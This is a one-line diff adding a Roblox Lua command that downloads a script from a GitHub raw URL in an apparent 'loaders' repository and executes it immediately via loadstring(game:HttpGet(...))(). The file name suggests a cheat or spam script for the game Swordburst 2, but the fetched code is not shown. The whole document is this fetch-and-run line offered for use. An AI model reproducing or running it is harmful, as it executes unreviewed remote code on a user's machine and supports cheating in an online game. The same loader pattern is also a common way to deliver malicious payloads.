@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/wave-defense-swordburst-2-spam6-6d2sg1lqod90w3.lua"))()
